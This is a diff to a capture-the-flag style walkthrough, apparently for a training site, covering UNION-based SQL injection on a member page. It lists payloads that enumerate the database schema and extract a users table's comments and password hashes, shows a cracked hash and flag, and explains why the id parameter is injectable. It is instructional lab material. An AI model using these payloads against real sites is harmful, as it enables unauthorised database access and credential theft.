@@ -9,12 +9,12 @@
 go to `/?page=member`
 
 submit :
-- `1 AND 1=2 UNION SELECT column_name , 1 FROM information_schema.columns`
-- `1 AND 1=2 UNION SELECT table_name , 1 FROM information_schema.columns`
-- `1 AND 1=2 UNION SELECT table_schema, 1 FROM information_schema.tables`
+- `1 UNION SELECT column_name , 1 FROM information_schema.columns`
+- `1 UNION SELECT table_name , 1 FROM information_schema.columns`
+- `1 UNION SELECT table_schema, 1 FROM information_schema.tables`
 
 then \
-`1 AND 1=2 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users`
+`1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users`
 
 "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
 
@@ -22,6 +22,21 @@ password => 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo
 
 FortyTwo = fortytwo 
 fortytwo => sh256 => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+---
+
+## How does it work ?
+
+The query executed by the server is probably like `SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id= ` and then it is filled with the parameter sent by the client which should be a number. The id parameter is not protected, which means that you can inject SQL without the server detecting any problem.
+
+You have to send a valid parameter to respect the SQL syntax : \
+`SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id=1`
+
+And then the door is opened to append another query to the current string :
+
+`SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id=1 UNION SELECT Commentaire, countersign FROM Member_images.list_images`
+
+The UNION statement allows us to get two other columns (the number of queried columns should be the same as in the first part of the query) from the table we want.
 
 ---
 
